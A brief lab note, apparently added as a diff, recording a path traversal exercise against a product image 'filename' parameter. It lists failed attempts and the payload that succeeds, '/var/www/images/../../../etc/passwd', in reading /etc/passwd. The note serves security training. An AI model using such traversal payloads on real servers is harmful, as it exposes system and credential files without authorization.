@@ -1,0 +1,19 @@
+Vulnerable parameter - Product images
+
+Goals: Display the content of the /etc/passwd file
+
+Analysis:
+--------
+
+filename=/var/www/images/29.jpg 
+-> the image
+
+filename=../../etc/passwd
+-> Missing parameter 'filename'
+
+filename=/etc/passwd
+-> Missing parameter 'filename'
+
+filename=/var/www/images/../../../etc/passwd
+
+Solved
